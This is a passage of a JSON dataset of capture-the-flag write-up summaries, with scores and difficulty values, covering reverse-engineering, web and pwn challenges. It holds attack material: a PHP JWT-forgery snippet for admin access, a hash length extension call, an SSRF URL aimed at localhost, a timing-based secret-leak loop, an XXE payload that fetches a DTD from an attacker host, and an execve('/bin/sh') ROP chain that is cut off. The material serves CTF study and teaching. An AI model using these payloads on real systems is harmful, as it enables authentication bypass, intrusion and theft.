            "For creating a malicious JWT in challenges involving insecure JWT implementations, modify the payload to elevate the privileges (e.g., changing the role to `admin`) and sign the token with the symmetric algorithm `HS256`, using the public key if it's incorrectly used for verification. Ensure the payload is formatted correctly according to JWT standards and include necessary claims like `iat` (issued at) and `nbf` (not before) to make the token valid. This approach leverages the server's failure to properly validate the JWT's signing algorithm, allowing for authentication bypass.\n\nExample payload creation snippet:\n```php\n$publikKey  = '-----BEGIN PUBLIC KEY-----(...Actual public key content...)-----END PUBLIC KEY-----';\n$issuedAt = new DateTimeImmutable();  \n$data = [  \n    \"role\" => \"admin\",  \n    \"iat\" => $issuedAt->getTimestamp(),  \n    \"nbf\" => $issuedAt->getTimestamp()  \n];\n$token = JWT::encode($data, $publikKey, 'HS256');\necho $token;\n```\nThis payload should then be set in the `jwt` cookie to exploit the vulnerability."
        ],
        "key": "```php\nfunction main()  \n{\n\n   $publikKey  = '-----BEGIN PUBLIC KEY-----  \nMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEApPRW0nXMoQyN8GzVCHaW  \nnWyq00omHh/o7AXEJvbpVBk5HTWLt+Zdj1aK1JFWU5lPeMSoXkf7WJiqoGgwVblX  \nRq2dSIIaNBFSjomS1Mcw1Tyx+q9Y6CPJGdwAMEMH5uKhGkgV9OrFQcHoozLAvzFl  \nBneqmTO9+V1FKEuHWHItvdP1em7UiUnZ7JXb13L4IbZVGPNgDVf0GoButIlVo1+T  \npMZcBHNV0ndGZg0e6qTCp5m9yMWcH697Rt2FRN4fgJpYBknBs8UrAeCczRkk6037  \nN+c4IM+St6KZNqg+4ZlRZC+V9zOBSTkrXXN/CXRUiIQMgmyit5zbEpN8PUY6VPzk  \nzVI9FbkB0nb+Dp04VPRWeeV1IKPZk2DuSOALh9ZacbEQ8Spuua6nxZ5gCSve7TL7  \nr9xg8ml5zZXAw7l8WoHkyy2ocPy0OL+PWFvUar59epfPUQZmRE08yVrlvy+WXFC2  \ndbFxD80tPgbcjJbKRGGv1uOx/3Z2HrXHoOslVmV87rgWfxBaJjrSsSY1fKLYJLnk  \nFKJd6eSLDYzTAczbMiov8F9ovMw4/juWZy2s4QOCdXp7byKOuQUJ+HSiZiNiyjTk  \nXaA5oGEF/FIxAMRbaEd/YSsE7ASMxS4mhyIAGFvqK8YZ+xqEAbNlT4zK+dAAC3mL  \nI/VyHBAlgHRxEiRE860DhfcCAwEAAQ==  \n-----END PUBLIC KEY-----';\n\n   $issuedAt = new DateTimeImmutable();  \n   $data = [  \n       \"role\" => \"admin\",  \n       \"iat\" => $issuedAt->getTimestamp(),  \n       \"nbf\" => $issuedAt->getTimestamp()  \n   ];\n\n   $token = JWT::encode($data, $publikKey, 'HS256');\n\n   echo $token;\n\n}\n```"
    },
    {
        "name": "JuniorCTF - ARM1",
        "write_up": "dataset/raw/JuniorCTF - ARM1.md",
        "type": "reverse",
        "competition": [
            "C3CTF/2017",
            "https://ctftime.org/event/544/tasks/"
        ],
        "score": 41,
        "max_score": 477,
        "difficulty": 0.0859538784067086,
        "knowledge": [
            "When analyzing binary files for CTF challenges, especially those intended for ARM architecture, extracting strings using the `strings` command can help identify potential flags or hints without in-depth reverse engineering. This step should be attempted early in the analysis process as it may quickly reveal useful information. Example command: `strings <binary_file> | grep <known_flag_format>`. In scenarios where the flag or part of it follows a known format (e.g., starting with `34C3` in the challenge), this method is particularly effective.",
            "For reverse engineering ARM Thumb 2 code, tools like IDA can be used to disassemble the binary. Setting the \"Processor type\" to \"ARM little-endian\" and correctly configuring the \"ROM start address\" and \"Loading address\" are crucial steps for accurate disassembly and analysis. Understanding the flow of the program (identifying the entry point and the main function) enables targeted analysis towards finding the logic that deals with flag manipulations or checks. This approach is universally applicable for ARM-based binary reverse engineering challenges."
        ],
        "key": "```c\nvoid main(void) {  \n sub_80003F8();  \n sub_8000304();  \n print_text(\"The flag is: 34C3_I_4dm1t_it_1_f0und_th!s_with_str1ngs\\r\\n\");  \n while ( 1 )  \n   ;  \n}\n```"
    },
    {
        "name": "JuniorCTF - ARM2",
        "write_up": "dataset/raw/JuniorCTF - ARM2.md",
        "type": "reverse",
        "competition": [
            "C3CTF/2017",
            "https://ctftime.org/event/544/tasks/"
        ],
        "score": 150,
        "max_score": 477,
        "difficulty": 0.31446540880503143,
        "knowledge": [
            "To reverse-engineer ARM assembly code, especially when targeting STM32 microcontrollers, using IDA Pro or any compatible binary analysis tool, one should set the \"Processor type\" to \"ARM little-endian\". Additionally, it's imperative to correctly configure both the \"ROM start address\" and the \"Loading address\" to 0x8000000 (or to the appropriate memory address based on the target device or binary). This setup is crucial for accurate disassembly and analysis of ARM-based firmware or binaries.",
            "XOR encryption is a common technique for obfuscating strings or data in binary challenges. If an encrypted string is identified where each byte of the string is XOR'd with a constant value, the decryption can be performed by XOR'ing the encrypted bytes with the same constant value. This approach is particularly useful in CTF challenges where flags are obfuscated using XOR. To decrypt, a simple script iterating over the encrypted data, applying XOR with the constant key, will reveal the original plaintext.\n   - Example payload/script to decrypt XOR encrypted data:\n     ```python\n     encrypted_bytes = [0x66, 0x61, 0x16, ...]  # truncated for brevity\n     decrypted_flag = ''.join(chr(byte ^ 0x55) for byte in encrypted_bytes)\n     print(decrypted_flag)  # Outputs the decrypted flag\n     ```"
        ],
        "key": "```c\nvoid main(void) {  \n sub_8000428();  \n sub_8000334();  \n print_text(\"The flag is: \");  \n for ( char *i = g_xored_bytes; *i; ++i )  \n   print_char(*i ^ 0x55);  \n print_text(\"\\r\\n\");  \n while ( 1 )  \n   ;  \n}  \n```"
    },
    {
        "name": "JuniorCTF - ARM3",
        "write_up": "dataset/raw/JuniorCTF - ARM3.md",
        "type": "reverse",
        "competition": [
            "C3CTF/2017",
            "https://ctftime.org/event/544/tasks/"
        ],
        "score": 171,
        "max_score": 477,
        "difficulty": 0.3584905660377358,
        "knowledge": [
            "When reverse engineering ARM thumb 2 code, setting up the environment correctly in IDA is crucial. This includes setting the \"Processor type\" to \"ARM little-endian\" and configuring both the \"ROM start address\" and \"Loading address\" properly, for this challenge to 0x8000000. This setup is necessary to correctly disassemble ARM binaries and trace through the execution flow accurately.",
            "To understand the logic of an embedded ARM application, identifying the main function and subsequent function calls is a critical first step. By tracing the function calls from the entry point, you can narrow down the focus to the relevant parts of the code. In this scenario, the flow was from `sub_8000108` (entry point) to `sub_80005D8`, and finally to `sub_8000290` (main function). In the main function, analyzing how input is processed and how checks are performed against this input allows for understanding the conditions needed to satisfy the challenge, thereby deducing the flag."
        ],
        "key": "```c\nvoid main(void) {  \n sub_8000558();  \n sub_8000440();  \n print_text(\"Enter flag: \");  \n for ( signed int i = 0; i <= 29; ++i )  \n {  \n   flag[i] = sub_8000534();  \n   read_char(flag[i]);                         // read 30 bytes  \n }  \n print_text(\"\\r\\n\");  \n if ( flag[9] != '_'  \n   || flag[21] != '0'  \n   || flag[26] != '_'  \n   || flag[2] != 'C'  \n   || flag[14] != '1'  \n   || flag[0] != '3'  \n   || flag[28] != 'o'  \n   || flag[11] != 'a'  \n   || flag[4] != '_'  \n   || flag[27] != 'n'  \n   || flag[17] != '4'  \n   || flag[8] != 'k'  \n   || flag[3] != '3'  \n   || flag[23] != 'A'  \n   || flag[15] != '_'  \n   || flag[7] != '0'  \n   || flag[1] != '4'  \n   || flag[24] != 'R'  \n   || flag[18] != 'n'  \n   || flag[5] != 'L'  \n   || flag[20] != 'd'  \n   || flag[12] != '!'  \n   || flag[22] != '_'  \n   || flag[13] != '_'  \n   || flag[10] != 'm'  \n   || flag[29] != 'w'  \n   || flag[16] != 'c'  \n   || flag[19] != '_'  \n   || flag[25] != 'M' )  \n {  \n   print_text(\"Wrong!\\r\\n\");  \n }  \n else  \n {  \n   print_text(\"Correct!\\r\\n\");  \n }  \n while ( 1 )  \n   ;  \n}  \n```"
    },
    {
        "name": "JuniorCTF - ARM4",
        "write_up": "dataset/raw/JuniorCTF - ARM4.md",
        "type": "reverse",
        "competition": [
            "C3CTF/2017",
            "https://ctftime.org/event/544/tasks/"
        ],
        "score": 290,
        "max_score": 477,
        "difficulty": 0.6079664570230608,
        "knowledge": [
            "When analyzing ARM binaries in reverse engineering challenges, particularly for embedded systems like the STM32F103 series, setting up the correct environment in IDA or a similar disassembler is crucial. This involves specifying the \"Processor type\" as \"ARM little-endian\" and correctly setting both the \"ROM start address\" and \"Loading address\", usually to 0x8000000 for STM32 series microcontrollers. This setup ensures accurate disassembly and analysis of the binary, allowing for proper understanding and manipulation of the code.",
            "For challenges involving complex mathematical or logical conditions that determine the validity of an input (e.g., a flag), symbolic execution or constraint solving can be effectively used to automate the process of finding valid inputs. Tools like Z3 can be leveraged to model the challenge's constraints as equations\u2014taking into account any known parts of the flag (e.g., a prefix like \"34C3_\") and iteratively solving to find possible solutions that satisfy all conditions. This method is particularly useful in scenarios where manual analysis is impractical due to the complexity or number of conditions.\n\nExample Python script segment utilizing Z3 for constraint solving:\n\n```python\nfrom z3 import *\n\ns = Solver()\n# Assuming x0 to x13 represent individual characters in the flag\nx = [BitVec(f'x{i}', 8) for i in range(14)]  # Create bit vectors for each character of the flag\ns.add(34*x[13]+-4*(x[1]+-5*x[0]+-16*x[2]+3*x[3])+... == 8701, ...)  # Add all given equations\n\n# If a prefix is known, for example \"34C3_\", you can add constraints like:\nprefix = \"34C3_\"\nfor i in range(len(prefix)):\n    s.add(x[i] == ord(prefix[i]))\n\n# Solve the equations\nif s.check() == sat:\n    m = s.model()\n    flag = ''.join(chr(m[x[i]].as_long()) for i in range(14))\n    print(f'Flag: {flag}')\nelse:\n    print(\"No solution found.\")\n```"
        ],
        "key": "```c\nvoid main(void) {  \n sub_8001100();  \n sub_8000FE8();  \n print_text(\"Enter flag: \");  \n for ( unsigned int i = 0; i <= 13; ++i )  \n {  \n   flag[i] = sub_80010DC();  \n   read_char(flag[i]);                         // read 14 bytes  \n }  \n print_text(\"\\r\\n\");  \n if ( 34 * flag[13] + -4 * (flag[1] - 5 * flag[0] - 16 * flag[2] + 3 *\nflag[3]) - 73 * flag[4] - 65 * flag[5] + 77 * flag[6] + 20 * flag[7] - 66 *\nflag[8] + 4 * flag[9] - 58 * flag[10] - 6 * flag[11] + 94 * flag[12] != 8701  \n   || -48 * flag[13] + -66 * flag[0] + 56 * flag[1] - 37 * flag[2] - 8 *\nflag[3] - 26 * flag[4] - 79 * flag[5] - 28 * flag[6] - 99 * flag[7] - 87 *\nflag[8] - 86 * flag[9] + 71 * flag[10] - 69 * flag[11] - 43 * flag[12] !=\n-40417  \n   || 38 * flag[13] + 93 * flag[0] + 77 * flag[1] - 43 * flag[2] - 19 *\nflag[3] + 99 * flag[4] + 61 * flag[5] + 5 * flag[6] - 67 * flag[7] - 60 *\nflag[8] + 88 * flag[9] + 41 * flag[10] + 19 * flag[11] + 70 * flag[12] !=\n34075  \n   || (flag[13] << 6) + -44 * flag[0] - 32 * flag[1] - 30 * flag[2] + 5 *\nflag[3] + 56 * flag[4] - 28 * flag[5] + 61 * flag[6] + 9 * flag[7] + 80 *\nflag[8] + 40 * flag[9] - 66 * flag[10] - 42 * flag[11] + 62 * flag[12] !=\n17090  \n   || -40 * flag[13] + -61 * flag[0] + 46 * flag[1] + 35 * flag[2] - 33 *\nflag[3] + 91 * flag[4] - 13 * flag[5] - 39 * flag[6] + 7 * flag[7] + 51 *\nflag[8] + 93 * flag[9] + 55 * flag[10] + 49 * flag[11] + 94 * flag[12] !=\n31516  \n   || 33 * flag[13] + 17 * flag[0] - 61 * flag[1] + 51 * flag[2] + 26 *\nflag[3] + 75 * flag[4] + 14 * flag[5] - 32 * flag[6] - 46 * flag[7] - 10 *\nflag[8] - 36 * flag[9] + 81 * flag[10] + 69 * flag[11] - 32 * flag[12] !=\n10846  \n   || 29 * flag[13] + 69 * flag[0] - 92 * flag[1] + 24 * flag[2] - 33 *\nflag[3] + 16 * flag[4] + 57 * flag[5] - 31 * flag[6] + 91 * flag[7] + 85 *\nflag[8] + 72 * flag[9] + 23 * flag[10] + 21 * flag[11] + 45 * flag[12] !=\n31883  \n   || -66 * flag[13] + -22 * flag[0] + 21 * flag[1] + 52 * flag[2] + 71 *\nflag[3] + 76 * flag[4] - 80 * flag[5] - 97 * flag[6] + 4 * flag[7] + 99 *\nflag[8] - 7 * flag[9] - 43 * flag[10] - 13 * flag[11] + 37 * flag[12] != -2288  \n   || -63 * flag[13] + -59 * flag[0] + 74 * flag[1] + 65 * flag[2] + 61 *\nflag[3] - 21 * flag[4] - 9 * flag[5] + 44 * flag[6] + 13 * flag[7] + 30 *\nflag[8] + 13 * flag[9] - 69 * flag[10] - 2 * flag[11] + 9 * flag[12] != 891  \n   || 74 * flag[13] + 51 * flag[0] + 58 * flag[1] + 16 * flag[2] + 58 *\nflag[3] + 83 * flag[4] + 30 * flag[5] - 57 * flag[6] - 27 * flag[7] - 28 *\nflag[8] + 94 * flag[9] + 55 * flag[10] + 72 * flag[11] - 96 * flag[12] !=\n24772  \n   || 56 * flag[13] + 68 * flag[0] - 5 * flag[1] + 19 * flag[2] - 85 * flag[3]\n+ 38 * flag[4] + 84 * flag[5] + 17 * flag[6] + 77 * flag[7] - 98 * flag[8] -\n37 * flag[9] - 38 * flag[10] + 32 * flag[11] - 45 * flag[12] != 7094  \n   || 59 * flag[13] + 13 * flag[0] + 99 * flag[1] - 21 * flag[2] + 58 *\nflag[3] + 26 * flag[4] + 18 * flag[5] - 87 * flag[6] + 26 * flag[7] - 77 *\nflag[8] - 47 * flag[9] + 33 * flag[10] - 45 * flag[11] - 78 * flag[12] !=\n-4767  \n   || 31 * flag[13] + -95 * flag[0] + 63 * flag[1] + 18 * flag[2] - 12 *\nflag[3] + 56 * flag[4] - 77 * flag[5] + 68 * flag[6] + 70 * flag[7] + 54 *\nflag[8] + 41 * flag[9] + 25 * flag[10] - 78 * flag[11] + 43 * flag[12] !=\n27400  \n   || -78 * flag[13] + 22 * flag[0] - 33 * flag[1] - 31 * flag[2] - 46 *\nflag[3] + 20 * flag[4] + 80 * flag[5] - 54 * flag[6] + 55 * flag[7] + 77 *\nflag[8] + 94 * flag[9] - 89 * flag[10] + 51 * flag[11] - 27 * flag[12] !=\n-4494 )  \n {  \n   print_text(\"Wrong!\\r\\n\");  \n }  \n else  \n {  \n   print_text(\"Correct!\\r\\n\");  \n }  \n while ( 1 )  \n   ;  \n}  \n```"
    },
    {
        "name": "JuniorCTF - Conversion Error",
        "write_up": "dataset/raw/JuniorCTF - Conversion Error.md",
        "type": "misc",
        "competition": [
            "C3CTF/2018",
            "https://ctftime.org/event/718/tasks/"
        ],
        "score": 87,
        "max_score": 500,
        "difficulty": 0.174,
        "knowledge": [
            "When confronted with a challenge that involves exploiting assertions in a programming language or VM, it is crucial to carefully analyze any provided assertion functions for logical weaknesses or conditions that can be met unexpectedly. In scenarios where the assertion involves complex conditionals or regular expressions, payload can be designed to make the assertion true by satisfying the overlooked or weaker parts of the condition.  \nExample payload: `alert(assert_conversion(\"1.1\"))`",
            "For challenges involving server-side code execution vulnerabilities, particularly those that offer an endpoint to test or run your own code, constructing a request with carefully crafted payload that exploits the vulnerability is key. This often involves sending requests with specific structures, taking advantage of known flaws in the implementation, such as how data types are converted or validated.  \nExample Python script snippet for sending payload:\n```Python\nurl = \"http://example.com/run\"  # The vulnerable endpoint\ndata_structure = \"\"\"{{ \"code\": {} }}\"\"\"  \ndata_content = \"\"\"alert(your_exploitative_code_here)\"\"\"  # The payload exploiting the vulnerability\n\ndata_content_to_send = json.dumps(data_content)  \ndata_to_send = data_structure.format(data_content_to_send)  \nresponse = requests.post(url, data=data_to_send)\n```"
        ],
        "key": "```typescript\nexternals.addFunction(  \n  \"assert_conversion\",  \n  [{name: \"str\", type: compiler.StringType}], compiler.StringType,  \n  false,  \n  (str: string) => str.length === +str + \"\".length ||\n!/^[1-9]+(\\.[1-9]+)?$/.test(str)  \n      ? \"Convert to Pastafarianism\" : flags.CONVERSION_ERROR  \n)  \n```"
    },
    {
        "name": "JuniorCTF - Equality Error",
        "write_up": "dataset/raw/JuniorCTF - Equality Error.md",
        "type": "misc",
        "competition": [
            "C3CTF/2018",
            "https://ctftime.org/event/718/tasks/"
        ],
        "score": 88,
        "max_score": 500,
        "difficulty": 0.176,
        "knowledge": [
            "When targeting an application that evaluates code server-side, especially in unconventional or custom languages, understanding the language's specific behaviors and features can reveal unique vulnerabilities. In the scenario of exploiting an assertion function, one such unique behavior is how the language handles special numerical values like `NaN` (Not a Number). Exploiting this requires generating a `NaN` value, which can be done by performing operations that would mathematically be undefined, such as taking the square root of a negative number.\n\n   Example payload: `alert(assert_equals(sqrt(-1)))`",
            "For challenges involving server-side code evaluation, constructing the exploit payload may also require proper formatting and encapsulation of the payload in a manner expected by the server, such as JSON in a POST request. It highlights the importance of not only crafting a logical exploit but also delivering it in a format that the target server can parse and execute as intended.\n\n   Example payload in Python script:  \n   ```python\n   import requests, json\n\n   url = \"http://35.207.189.79/wee/run\"  \n   data_structure = \"\"\"{{ \"code\": {} }}\"\"\"  \n   data_content = \"\"\"alert(assert_equals(sqrt(-1)))\"\"\"\n   \n   data_content_to_send = json.dumps(data_content)  \n   data_to_send = data_structure.format(data_content_to_send)  \n   print(f\"[*] Payload: '{data_to_send}'.\")  \n   response = requests.post(url, data=data_to_send)  \n   print(f\"[*] Response: '{response.text}'.\")\n   ```"
        ],
        "key": "```typescript\nexternals.addFunction(  \n  \"assert_equals\",  \n  [{name: \"num\", type: compiler.NumberType}], compiler.StringType,  \n  false,  \n  (num: number) => num === num  \n      ? \"EQUALITY WORKS\" : flags.EQUALITY_ERROR  \n)  \n```"
    },
    {
        "name": "JuniorCTF - kim",
        "write_up": "dataset/raw/JuniorCTF - kim.md",
        "type": "This write-up belongs to a **web** challenge.",
        "competition": [
            "C3CTF/2017",
            "https://ctftime.org/event/544/tasks/"
        ],
        "score": 94,
        "max_score": 477,
        "difficulty": 0.1970649895178197,
        "knowledge": [
            "When faced with a scenario where a service generates a salted SHA1 hash of a query and you're given a known query-hash pair without the salt, consider a hash length extension attack. A hash length extension attack allows one to append data to the original query and generate a valid hash for the new query without knowing the salt. This technique is especially applicable if you can infer or brute-force the length of the salt. Tools like `hlextend` can be utilized for performing the attack effectively.",
            "The utility of a hash length extension attack increases when the application logic favors later occurrences of a parameter in a query. If an application uses the last occurrence of a parameter when the same parameter is specified multiple times, an attacker can append a manipulated parameter set that benefits from the application's handling to achieve unintended outcomes, such as accessing restricted files. \n\nExample usage with `hlextend`:\n```python\nimport hlextend\nsha = hlextend.new('sha1')\nnew_query = sha.extend('f=flag', 'f=sample.gif', 15, '952bb2a215b032abe27d24296be099dc3334755c', raw=True)\nnew_sha = sha.hexdigest()\n# This generates the new query and SHA1 hash, which then can be used to perform the intended action.\n```"
        ],
        "key": "```python\nimport hashlib\n\ndef verify_query(query, provided_hash, salt):\n    salted_query = salt + query\n    return hashlib.sha1(salted_query.encode()).hexdigest() == provided_hash\n\ndef process_request(query):\n    salt = \"random_salt_value\"  # The salt is unknown to the attacker\n    provided_hash = \"952bb2a215b032abe27d24296be099dc3334755c\"  # Example hash\n    if verify_query(query, provided_hash, salt):\n        if \"f=flag\" in query:\n            return \"Access granted to flag\"\n        else:\n            return \"Access denied\"\n    else:\n        return \"Invalid hash\"\n\n# Example usage\nquery = \"f=sample.gif\"\nprint(process_request(query))\n```\n"
    },
    {
        "name": "JuniorCTF - localhost",
        "write_up": "dataset/raw/JuniorCTF - localhost.md",
        "type": "web",
        "competition": [
            "C3CTF/2018",
            "https://ctftime.org/event/718/tasks/"
        ],
        "score": 81,
        "max_score": 500,
        "difficulty": 0.162,
        "knowledge": [
            "When exploiting server configurations that use specific headers to identify or authenticate localhost requests, one can manipulate request headers or parameters to simulate requests coming from the localhost. This involves identifying server-side functionalities that interpret the incoming request's origin and manipulate these to treat the external request as originating from localhost. This can be achieved by using server functionalities meant for local requests, such as image proxying functionalities that do not adequately verify the origin of the request or blindly trust certain headers. Sample payload: `http://target.com/api/proxyimage?url=http://127.0.0.1:port/resource`",
            "Restrictions based on content types, such as only allowing image content types to be processed by certain functionalities, can be bypassed or exploited. If a functionality is designed to process only specific file types (e.g., images), but does not securely verify the actual content or the source of the file, attackers can leverage this functionality to perform unintended actions by carefully crafting the requests. This requires the attacker to provide a valid file of the allowed type that also serves the attacker's purpose, such as triggering server-side behaviors or leaking sensitive information."
        ],
        "key": "```Python  \n# Proxy images to avoid tainted canvases when thumbnailing.  \n@app.route(\"/api/proxyimage\", methods=[\"GET\"])  \ndef proxyimage():  \n   url = request.args.get(\"url\", '')  \n   parsed = parse.urlparse(url, \"http\")  # type: parse.ParseResult  \n   if not parsed.netloc:  \n       parsed = parsed._replace(netloc=request.host)  # type: parse.ParseResult  \n   url = parsed.geturl()\n\n   resp = requests.get(url)  \n   if not resp.headers[\"Content-Type\"].startswith(\"image/\"):  \n       raise Exception(\"Not a valid image\")\n\n   # See https://stackoverflow.com/a/36601467/1345238  \n   excluded_headers = ['content-encoding', 'content-length', 'transfer-\nencoding', 'connection']  \n   headers = [(name, value) for (name, value) in resp.raw.headers.items()  \n              if name.lower() not in excluded_headers]\n\n   response = Response(resp.content, resp.status_code, headers)  \n   return response  \n```"
    },
    {
        "name": "JuniorCTF - _dev_null",
        "write_up": "dataset/raw/JuniorCTF - _dev_null.md",
        "type": "misc",
        "competition": [
            "C3CTF/2018",
            "https://ctftime.org/event/718/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "A blind code injection vulnerability can be exploited using timing attacks if the server executes queries or scripts based on user input. When direct output is not available, differential analysis of response times for different inputs can be used to infer values. This technique is applicable in scenarios where the server's execution time can be influenced by input conditions.\nExample payload: if charAt(variable, position) == 'a' then pause(4500) end",
            "When dealing with code execution in a sandboxed or limited output environment, leveraging built-in language functions such as `pause` (to manipulate execution time) and string comparison functions like `charAt` (to check one character at a time) allows for exfiltrating data indirectly via side-channel attacks (timing attacks). This approach can be effective even when direct data extraction methods are not viable.\nExample payload loop structure: for each char in [charList]: if charAt(secret, currentPos) == char then pause(4500)"
        ],
        "key": "```Python  \ndef runwee(wee: string) -> string:  \n   print(\"{}: running {}\".format(request.remote_addr, wee))  \n   result = check_output(  \n       [\"ts-node\", '--cacheDirectory', os.path.join(WEE_PATH, \"__cache__\"),  \n        os.path.join(WEE_PATH, WEETERPRETER), wee], shell=False, stderr=STDOUT, timeout=WEE_TIMEOUT,  \n       cwd=WEE_PATH).decode(\"utf-8\")  \n   print(\"{}: result: {}\".format(request.remote_addr, result))  \n   return result\n\n@app.route(\"/wee/dev/null\", methods=[\"POST\"])  \ndef dev_null():  \n   json = request.get_json(force=True)  \n   wee = json[\"code\"]  \n   wee = \"\"\"  \n   var DEV_NULL: string = '{}'  \n   {}  \n   \"\"\".format(DEV_NULL, wee)  \n   _ = runwee(wee)  \n   return \"GONE\"  \n```"
    },
    {
        "name": "Just another heap",
        "write_up": "dataset/raw/Just another heap.md",
        "type": "pwn",
        "competition": [
            "DCTF/2021",
            "https://ctftime.org/event/1361/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "In scenarios involving heap exploitation where the program allows for dynamic memory allocation and manipulates global pointers or GOT entries, setting an overly large length for `malloc` to force a null pointer and then precisely calculating an offset for a controlled write operation can effectively bypass security measures for arbitrary write conditions. By setting the length to `2**64 - 2**32 + target_address + desired_size`, malloc will fail and set the pointer to null (0x0), enabling a controlled _write-what-where_ condition by adjusting `target_address` for the _where_ and `desired_size` for the _what_. This technique can be used to modify GOT entries or other critical data structures for further exploitation.",
            "To leak libc addresses in heap exploitation challenges, manipulating global pointers to point to GOT entries can be an effective approach. First, create a heap chunk whose pointer is stored in a global array. Use a _write-what-where_ vulnerability to overwrite this global pointer to point to a Global Offset Table (GOT) entry or another known location in memory that contains a libc address. Subsequently, trigger functionality in the program that dereferences this pointer, causing the program to output the libc address. This approach allows for bypassing certain security mechanisms and facilitates libc address leakage, providing a path to system compromise."
        ],
        "key": "```c\nputs(\"name:\");  \nuVar2 = local_38;  \npvVar3 = malloc(0x20);  \n*(void **)(&memory_name_ptr_00602260 + uVar2 * 8) = pvVar3;  \nprompt_fgets(*(undefined8 *)(&memory_name_ptr_00602260 + local_38 * 8),0x10);  \nlVar1 = *(long *)(&memory_name_ptr_00602260 + local_38 * 8);  \nsVar4 = strcspn(*(char **)(&memory_name_ptr_00602260 + local_38 * 8),\"\\n\");  \n*(undefined *)(sVar4 + lVar1) = 0;  \nputs(\"How long is your memory\");  \nprompt_lu(&local_48);  \nlocal_30 = malloc(local_48);  \nputs(\"Sometimes our memories fade and we only remember parts of them.\");  \nprompt_lu(&local_40);  \nputs(\"Would you like to leave some space at the beginning in case you remember later?\");  \nif (local_48 < local_40) {  \n  puts(\"Invalid offset\");  \n}  \nelse {  \n  if (local_30 != (void *)0x0) {  \n    local_4c = 0;  \n    while ((ulong)(long)local_4c < local_40) {  \n      *(undefined *)((long)local_30 + (long)local_4c) = 0x5f;  \n      local_4c = local_4c + 1;  \n    }  \n  }  \n  local_30 = (void *)((long)local_30 + local_40);  \n  fflush(stdin);  \n  puts(\"What would you like to write\");  \n  prompt_fgets(local_30,local_48 - local_40);  \n  puts(\"Would you say this memory is important to you? [Y/N]\");  \n  prompt_fgets(local_24,2);  \n}\n```"
    },
    {
        "name": "Just Go Around",
        "write_up": "dataset/raw/Just Go Around.md",
        "type": "web",
        "competition": [
            "Square/2023",
            "https://ctftime.org/event/2111/tasks/"
        ],
        "score": 250,
        "max_score": 500,
        "difficulty": 0.5,
        "knowledge": [
            "When encountering a web application that involves a modern NoSQL DB and features such as fuzzy text search, it is important to consider the concept of \"soft deletes\" in attempting to retrieve supposedly deleted content. Soft deletes are a method where data isn't actually removed from the database but is instead flagged as deleted or made inaccessible to standard user queries. This knowledge could be crucial in challenges where accessing deleted content could lead to discovering hidden or secret information.",
            "In web applications where user input is serialized into XML before being processed, there is a potential vulnerability for an XXE (XML External Entity) attack. An XXE attack can be exploited to perform actions unintended by the application's design, such as accessing local files (LFI), SSRF (Server Side Request Forgery), or even executing remote code under certain conditions. To exploit this vulnerability, one can craft a malicious XML document that includes directives to load data from external sources or internal files that the attacker shouldn't have access to. This attack vector can be particularly useful in scenarios where the goal is to access configuration files, sensitive data, or interact with internal systems (like a database) that are not directly accessible from the web application's front end.\n   - Example payload for XXE to perform SSRF: ```<?xml version=\"1.0\" ?><!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://attacker-controlled-site.com/malicious.dtd\">%remote;%int;%trick;]>```"
        ],
        "key": "```go\npackage main\n\nimport (\n\t\"encoding/xml\"\n\t\"fmt\"\n\t\"net/http\"\n\t\"os\"\n)\n\ntype Post struct {\n\tTitle   string `xml:\"title\"`\n\tContent string `xml:\"content\"`\n}\n\nfunc createPostHandler(w http.ResponseWriter, r *http.Request) {\n\tif r.Method == http.MethodPost {\n\t\tvar post Post\n\t\terr := xml.NewDecoder(r.Body).Decode(&post)\n\t\tif err != nil {\n\t\t\thttp.Error(w, \"Invalid XML\", http.StatusBadRequest)\n\t\t\treturn\n\t\t}\n\n\t\t// Simulate saving to database\n\t\tfmt.Fprintf(w, \"Post created: %s\", post.Title)\n\t} else {\n\t\thttp.Error(w, \"Method not allowed\", http.StatusMethodNotAllowed)\n\t}\n}\n\nfunc main() {\n\thttp.HandleFunc(\"/create\", createPostHandler)\n\tport := os.Getenv(\"PORT\")\n\tif port == \"\" {\n\t\tport = \"8080\"\n\t}\n\thttp.ListenAndServe(\":\"+port, nil)\n}\n```"
    },
    {
        "name": "Just pwn it",
        "write_up": "dataset/raw/Just pwn it.md",
        "type": "pwn",
        "competition": [
            "ASIS/2021/Quals",
            "https://ctftime.org/event/1415/tasks/"
        ],
        "score": 51,
        "max_score": 500,
        "difficulty": 0.102,
        "knowledge": [
            "When exploiting a binary with a stack overflow vulnerability, it is crucial to understand the binary's security mechanisms to develop an effective exploit. The presence of security mitigations like No eXecute (NX), Position Independent Executable (PIE), and stack canaries, along with the binary's architecture (32-bit or 64-bit), greatly influence the exploit development process. For instance, in binaries compiled without PIE (No PIE), and with NX enabled but no stack canaries, an attacker can execute a Return-Oriented Programming (ROP) attack by overwriting the return address with a carefully crafted sequence of gadget addresses found within the binary. This method can be used to bypass the NX protection by redirecting the program's execution flow to the desired gadgets to execute arbitrary code.",
            "In scenarios where direct code execution is not possible due to NX protections, pivoting the stack to a controlled area of memory where the ROP payload is stored enables the execution of a ROP chain. This can be achieved by exploiting vulnerabilities that allow controlling the stack pointer (e.g., through an arbitrary write vulnerability or, as demonstrated, by manipulating function saved base pointers). Once the stack is pivoted, a ROP chain can be executed to perform arbitrary operations, such as spawning a shell. The ROP chain is crafted using a sequence of gadgets to execute system calls directly, bypassing the need for function calls to system libraries, which is particularly useful in statically linked binaries where external library calls are not an option.\n\nExample ROP chain:  \n```python\nPOP_RDI = 0x0000000000401b0d  \nPOP_RSI = 0x00000000004019a3  \nPOP_RDX = 0x0000000000403d23  \nPOP_RAX = 0x0000000000401001  \nSYSCALL = 0x00000000004013e9  \nMOV_RSI_PTR_RAX = 0x0000000000406c32  \nPT_LOAD_W = writable_segment_address  # Example address to write \"/bin/sh\"\n\npayload = [\n    POP_RSI, b\"/bin/sh\\x00\",  # Set RSI to point to \"/bin/sh\\x00\"\n    POP_RAX, PT_LOAD_W,       # Load the address of a writable segment into RAX\n    MOV_RSI_PTR_RAX,          # Move the string \"/bin/sh\\x00\" into the writable segment\n    POP_RAX, 0x3b,            # Load sys_execve syscall number into RAX\n    POP_RDI, PT_LOAD_W,       # Load the address of \"/bin/sh\" into RDI\n    POP_RSI, 0x0,             # Clear RSI\n    POP_RDX, 